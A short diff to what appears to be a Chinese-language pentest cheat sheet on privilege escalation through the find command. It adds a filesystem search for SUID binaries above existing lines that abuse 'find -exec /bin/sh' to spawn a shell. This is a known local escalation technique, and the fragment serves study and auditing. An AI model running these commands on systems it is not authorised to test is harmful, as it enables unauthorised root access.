@@ -1,6 +1,9 @@
 ### `find` 提权
 
 ```
+find / -perm -u=s -type f 2>/dev/null
+
+
 1. find ./ acce -exec '/bin/sh' \;
 
 2. touch bcce
